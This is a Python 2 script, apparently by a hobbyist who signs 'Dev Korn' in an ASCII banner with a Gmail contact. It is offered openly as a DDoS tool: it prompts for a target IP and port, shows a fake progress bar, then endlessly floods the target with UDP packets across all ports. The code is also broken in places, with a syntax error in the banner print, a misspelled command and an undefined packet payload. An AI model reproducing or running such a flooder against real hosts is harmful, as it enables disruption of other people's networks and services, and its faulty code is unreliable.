print ("
███████╗███╗   ███╗███████╗    ██████╗ ██╗   ██╗    ██████╗ ███████╗██╗   ██╗    ██╗  ██╗ ██████╗ ██████╗ ███╗   ██╗
██╔════╝████╗ ████║██╔════╝    ██╔══██╗╚██╗ ██╔╝    ██╔══██╗██╔════╝██║   ██║    ██║ ██╔╝██╔═══██╗██╔══██╗████╗  ██║
███████╗██╔████╔██║███████╗    ██████╔╝ ╚████╔╝     ██║  ██║█████╗  ██║   ██║    █████╔╝ ██║   ██║██████╔╝██╔██╗ ██║
╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗  ╚██╔╝      ██║  ██║██╔══╝  ╚██╗ ██╔╝    ██╔═██╗ ██║   ██║██╔══██╗██║╚██╗██║
███████║██║ ╚═╝ ██║███████║    ██████╔╝   ██║       ██████╔╝███████╗ ╚████╔╝     ██║  ██╗╚██████╔╝██║  ██║██║ ╚████║
╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝    ╚═╝       ╚═════╝ ╚══════╝  ╚═══╝      ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
FB : Ko Rn
Gmail : Backend1337@gmail.com
")
# DDOS TO TARGET IP BY DEV KORN software engineer
import os,sys

os.system ("figlet MALWARE | lolcat ")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
##############

os.system("clear")
os.system("figlet BLLETWARE | lolcat")
print
print
ip = raw_input("IP Target : ")
port = input("Port      :  ")

os.system("claer")
os.system("figlet SHOOT ! ! | lolcat")
print "[                     ] 0% "
time.sleep(3)
print "[=====>               ] 25%"
time.sleep(3)
print "[==========>          ] 50%"
time.sleep(3)
print "[===============>     ] 75%"
time.sleep(3)
print "[====================>] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
